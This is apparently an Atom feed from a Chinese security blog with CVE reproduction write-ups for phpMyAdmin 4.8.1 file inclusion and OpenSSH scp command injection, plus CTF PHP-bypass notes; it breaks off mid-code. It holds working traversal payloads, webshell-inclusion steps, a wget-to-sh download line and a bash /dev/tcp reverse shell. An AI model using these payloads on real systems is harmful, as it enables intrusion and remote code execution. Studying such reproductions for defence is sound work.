<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-10-09T06:32:19.185Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phpMyAdmin-4.8.1-CVE-2018-12613</title>
    <link href="http://yoursite.com/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/"/>
    <id>http://yoursite.com/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/</id>
    <published>2020-10-07T08:00:38.000Z</published>
    <updated>2020-10-09T06:32:19.185Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-关于phpmyadmin"><a href="#0x01-关于phpmyadmin" class="headerlink" title="0x01 关于phpmyadmin"></a>0x01 关于phpmyadmin</h2><p>phpMyAdmin 是众多 MySQL图形化管理工具中使用最为广泛的一种，是一款使用PHP 开发的基于B/S模式的 MySQL 客户端软件，该工具是基于 Web 跨平台的管理程序，并且支持简体中文，用户可以在官网上下载最新版本的。phpMyAdmin 为Web 开发人员提供了类似 Access，SQL Server 的图形化数据库操作界面，通过该管理工具可以对 MySQL 进行各种操作，如何创建数据库，数据表和生成 MySQL 数据库脚本文件等。</p><h2 id="0x02漏洞描述"><a href="#0x02漏洞描述" class="headerlink" title="0x02漏洞描述"></a>0x02漏洞描述</h2><p>攻击者可以在该漏洞中包含（查看并可能执行）服务器上的文件。</p><p>该漏洞来自代码的一部分，其中页面被重定向并在phpMyAdmin中加载，以及对白名单页面的不正确测试。</p><p>除以下情况外，必须对攻击者进行身份验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- $ cfg [&#39;AllowArbitraryServer&#39;] &#x3D; true：攻击者可以指定他&#x2F;她已控制的任何主机，并在phpMyAdmin上执行任意代码</span><br><span class="line">- $ cfg [&#39;ServerDefault&#39;] &#x3D; 0：这绕过登录并运行易受攻击的代码，而无需任何身份验证</span><br></pre></td></tr></table></figure><h2 id="0x03影响版本"><a href="#0x03影响版本" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h2><p>phpMyAdmin 4.8.0和4.8.1</p><h2 id="0x04复现环境"><a href="#0x04复现环境" class="headerlink" title="0x04复现环境"></a>0x04复现环境</h2><p>phpstudy+phpmyadmin4.8.1</p><h2 id="0x05漏洞分析"><a href="#0x05漏洞分析" class="headerlink" title="0x05漏洞分析"></a>0x05漏洞分析</h2><p>该漏洞点在index.php中的55~64行的代码处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析上面的代码，这里有五个判断，只有都为真才能进入到下面的包含</p><ul><li><code>$_REQUEST[&#39;target&#39;]</code>不能为空</li><li><code>$_REQUEST[&#39;target&#39;]</code>必须为字符串</li><li><code>$_REQUEST[&#39;target&#39;]</code>不能够以index开头</li><li><code>$_REQUEST[&#39;target&#39;]</code>不能出现在<code>$target_blacklist</code>中的内容</li><li>满足<code>Core::checkPageValidity()</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>可以看到只要传入的参数不是import.php或者export.php即可</p><p>跟进一下<code>Core::checkPageValidity()</code>,路径为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\libraries\classes\Core.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">$whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">//判断是否在$whitelist中</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_page = mb_substr(<span class="comment">//返回指定长度的$page的值</span></span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)<span class="comment">//拼接?,查找$page第一次出现？的位置</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_page = urldecode($page);<span class="comment">//url解码</span></span><br><span class="line">    <span class="comment">//再次重复上面的检测</span></span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的问题出现在解码及后面部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过url解码之后判断是否在<code>$whitelist</code>中，跟进<code>self::$goto_whitelist</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'db_datadict.php'</span>,</span><br><span class="line">        <span class="string">'db_sql.php'</span>,</span><br><span class="line">        <span class="string">'db_events.php'</span>,</span><br><span class="line">        <span class="string">'db_export.php'</span>,</span><br><span class="line">        <span class="string">'db_importdocsql.php'</span>,</span><br><span class="line">        <span class="string">'db_multi_table_query.php'</span>,</span><br><span class="line">        <span class="string">'db_structure.php'</span>,</span><br><span class="line">        <span class="string">'db_import.php'</span>,</span><br><span class="line">        <span class="string">'db_operations.php'</span>,</span><br><span class="line">        <span class="string">'db_search.php'</span>,</span><br><span class="line">        <span class="string">'db_routines.php'</span>,</span><br><span class="line">        <span class="string">'export.php'</span>,</span><br><span class="line">        <span class="string">'import.php'</span>,</span><br><span class="line">        <span class="string">'index.php'</span>,</span><br><span class="line">        <span class="string">'pdf_pages.php'</span>,</span><br><span class="line">        <span class="string">'pdf_schema.php'</span>,</span><br><span class="line">        <span class="string">'server_binlog.php'</span>,</span><br><span class="line">        <span class="string">'server_collations.php'</span>,</span><br><span class="line">        <span class="string">'server_databases.php'</span>,</span><br><span class="line">        <span class="string">'server_engines.php'</span>,</span><br><span class="line">        <span class="string">'server_export.php'</span>,</span><br><span class="line">        <span class="string">'server_import.php'</span>,</span><br><span class="line">        <span class="string">'server_privileges.php'</span>,</span><br><span class="line">        <span class="string">'server_sql.php'</span>,</span><br><span class="line">        <span class="string">'server_status.php'</span>,</span><br><span class="line">        <span class="string">'server_status_advisor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_monitor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_queries.php'</span>,</span><br><span class="line">        <span class="string">'server_status_variables.php'</span>,</span><br><span class="line">        <span class="string">'server_variables.php'</span>,</span><br><span class="line">        <span class="string">'sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_addfield.php'</span>,</span><br><span class="line">        <span class="string">'tbl_change.php'</span>,</span><br><span class="line">        <span class="string">'tbl_create.php'</span>,</span><br><span class="line">        <span class="string">'tbl_import.php'</span>,</span><br><span class="line">        <span class="string">'tbl_indexes.php'</span>,</span><br><span class="line">        <span class="string">'tbl_sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_export.php'</span>,</span><br><span class="line">        <span class="string">'tbl_operations.php'</span>,</span><br><span class="line">        <span class="string">'tbl_structure.php'</span>,</span><br><span class="line">        <span class="string">'tbl_relation.php'</span>,</span><br><span class="line">        <span class="string">'tbl_replace.php'</span>,</span><br><span class="line">        <span class="string">'tbl_row_action.php'</span>,</span><br><span class="line">        <span class="string">'tbl_select.php'</span>,</span><br><span class="line">        <span class="string">'tbl_zoom_select.php'</span>,</span><br><span class="line">        <span class="string">'transformation_overview.php'</span>,</span><br><span class="line">        <span class="string">'transformation_wrapper.php'</span>,</span><br><span class="line">        <span class="string">'user_password.php'</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>只要传入的参数在白名单中就会返回True</p><p>总的来说，这个漏洞就是利用<code>urldecode()</code>函数绕过白名单检测，<code>?</code>进行两次url编码得到<code>%253f</code>，传入的<code>%253f</code>经过服务器的自动解码和函数解码之后，就会截取<code>?</code>之前的内容，只要在白名单中就会返回<code>true</code>。而在index.php中，会进行包含，只有服务端进行了一次url解码，也就是<code>???.php%3f</code>,php默认解析成目录，所以要跳出该文件夹目录。</p><h2 id="0x06漏洞利用"><a href="#0x06漏洞利用" class="headerlink" title="0x06漏洞利用"></a>0x06漏洞利用</h2><h3 id="1-读取phpinfo"><a href="#1-读取phpinfo" class="headerlink" title="1.读取phpinfo"></a>1.读取phpinfo</h3><p>在www目录下新建<code>phpinfo.php</code>，尝试包含读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//localhost/phpMyAdmin-4.8.1-all-languages/phpMyAdmin-4.8.1-all-languages/index.php?target=db_sql.php%253f/../../../phpinfo.php</span></span><br><span class="line"><span class="comment">//这里注意本身被解码后的db_sql.php%3f/也是一层目录，要用一个../跳出当前目录</span></span><br></pre></td></tr></table></figure><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/1.png" class=""><h3 id="2-写入shell，包含之"><a href="#2-写入shell，包含之" class="headerlink" title="2.写入shell，包含之"></a>2.写入shell，包含之</h3><p>新建数据库，新建表，列名直接插入一句话</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/2.png" class=""><p>在<code>phpStudy/MySQL/data/test</code>路径下， 可以看到生成的<code>test.frm</code>，打开可以看到表的列名</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/3.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../MySQL/data/test/test.frm&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>可以看到包含成功</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/4.png" class=""><h3 id="3-包含日志文件"><a href="#3-包含日志文件" class="headerlink" title="3.包含日志文件"></a>3.包含日志文件</h3><p>sql查询处查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo();?&gt;&#39;</span><br></pre></td></tr></table></figure><p>记下网页的cookie，找到phpMyAdmin的</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/5.png" class=""><p>包含session文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../tmp/tmp/sess_2ro2cebrk3jkqvnp8eoopl0dueisdgj3</span><br></pre></td></tr></table></figure><p>成功包含，看一下效果</p><img src="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/6.png" class=""><p>相关方面的知识练手可以从下题进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[HCTF%202018]WarmUp</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考文章</span><br><span class="line">http:<span class="comment">//www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-复现分析/</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/weixin_43872099/article/details/104128639</span></span><br><span class="line">https:<span class="comment">//www.phpmyadmin.net/security/PMASA-2018-4/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-关于phpmyadmin&quot;&gt;&lt;a href=&quot;#0x01-关于phpmyadmin&quot; class=&quot;headerlink&quot; title=&quot;0x01 关于phpmyadmin&quot;&gt;&lt;/a&gt;0x01 关于phpmyadmin&lt;/h2&gt;&lt;p&gt;phpMyAdmin
      
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>OpenSSH的scp命令注入CVE-2020-15778</title>
    <link href="http://yoursite.com/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/"/>
    <id>http://yoursite.com/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/</id>
    <published>2020-10-01T07:37:21.000Z</published>
    <updated>2020-10-01T08:47:19.135Z</updated>
    
    <content type="html"><![CDATA[<p>复现的第一个CVE，虽然比较鸡肋的感觉，但还是有必要记录一下<a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>感觉比较鸡肋的原因，就是得先知道ssh的登录密码，这一点还是比较困难的</p><p>OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令</p><p>SCP(secure copy)是linux系统下基于ssh登录进行安全远程文件拷贝的命令，可以在linux之间复制文件和目录</p><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><p><strong>Openssh</strong></p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>OpenSSH&lt;=8.3p1</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用scp复制文件到远程服务器时，在scp命令后面跟上文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp SourceFile user@ip:directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><p>scp会使用”-t“参数来获取存储传入文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -t directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/1.png" class=""><p>问题在<code>scp.c</code>文件的989行，传入路径未进行检测，利用反引号可以包裹poc，加上文件名执行scp命令。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">环境</span><br><span class="line">靶机：centos</span><br><span class="line">攻击机：kali</span><br><span class="line">场景：已知ssh密码</span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'/tmp/test/111'</span><br></pre></td></tr></table></figure><p>可以看到成功通过scp发送到靶机</p><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/2.png" class=""><p>接下来试着创建一个hack.sh文件，文件内容为空，可以在自己的服务器上搭建包含shell的hack.sh，通过wget命令下载shell并且执行，这里不演示这个过程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'`touch /tmp/test/hack.sh`/tmp/test/444'</span><br></pre></td></tr></table></figure><img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/3.png" class=""><p>带wget的poc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'wget https://unknownsource.com/possiblydangerous.sh -O- | sh /tmp/test/444'</span><br></pre></td></tr></table></figure><p>下一步就可以反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 111.txt root@ip:'`bash -i &gt;&amp; /dev/tcp/攻击机ip/端口 0&gt;&amp;1`/tmp/test/'</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>厂商暂未发布补丁，建议使用rsync代替scp</p><p>保存好自己的ssh密码，加强密钥强度，周期性更新密码</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;245225.html</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;166028229</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cpandya2909&#x2F;CVE-2020-15778&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现的第一个CVE，虽然比较鸡肋的感觉，但还是有必要记录一下
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>PHPcharacter</title>
    <link href="http://yoursite.com/2020/09/25/PHPcharacter/"/>
    <id>http://yoursite.com/2020/09/25/PHPcharacter/</id>
    <published>2020-09-25T13:40:31.000Z</published>
    <updated>2020-10-09T06:29:47.839Z</updated>
    
    <content type="html"><![CDATA[<p>php特性<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">关于intval函数知识点</span><br><span class="line">int intval ( mixed $var [, int $base = <span class="number">10</span> ] )</span><br><span class="line">参数说明：</span><br><span class="line">$var：要转换成 integer 的数量值。</span><br><span class="line">$base：转化所使用的进制。</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：如果字符串包括了 <span class="string">"0x"</span> (或 <span class="string">"0X"</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；如果字符串以 <span class="string">"0"</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，将使用 <span class="number">10</span> 进制 (decimal)。</span><br></pre></td></tr></table></figure><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[0-9]/"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用数组绕过，intval()函数在处理数组时会返回1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强比较，必须是数值，且值相等</p><p>这里首先想到的是用进制绕过，十六进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br><span class="line">补充，可以增加一个空格绕过</span><br><span class="line">num=%<span class="number">204476</span></span><br></pre></td></tr></table></figure><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^php$/im'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^php$/i'</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'hacker'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求匹配到php但是又不能含有php，这里绕过的点在于正则中的<code>/m</code>,多行匹配模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">cmd=%<span class="number">0</span>aphp</span><br></pre></td></tr></table></figure><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>依旧可以用进制绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span 